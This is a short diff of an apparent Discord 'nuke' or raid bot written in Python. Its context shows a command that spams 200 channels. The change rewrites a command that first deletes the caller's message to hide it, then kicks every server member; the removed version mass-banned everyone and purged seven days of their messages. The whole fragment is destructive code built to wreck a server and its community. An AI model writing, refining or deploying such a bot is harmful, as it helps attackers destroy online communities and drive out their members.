@@ -36,12 +36,12 @@ async def create(ctx):
      for i in range(200):
         await ctx.guild.create_text_channel("튀엣")
         
-@client.command()
+@client.command(pass_context=True)
 async def kick(ctx):
-     for member in client.get_all_members():
-        if member.bot and SKIP_BOTS:
-            continue
-        await member.ban(reason="Banned by BanBot", delete_message_days=7)
+    await ctx.message.delete()
+    guild = ctx.message.guild
+    for member in list(client.get_all_members()):
+        await guild.kick(member)
         
 @client.command()
 async def cmd(ctx):
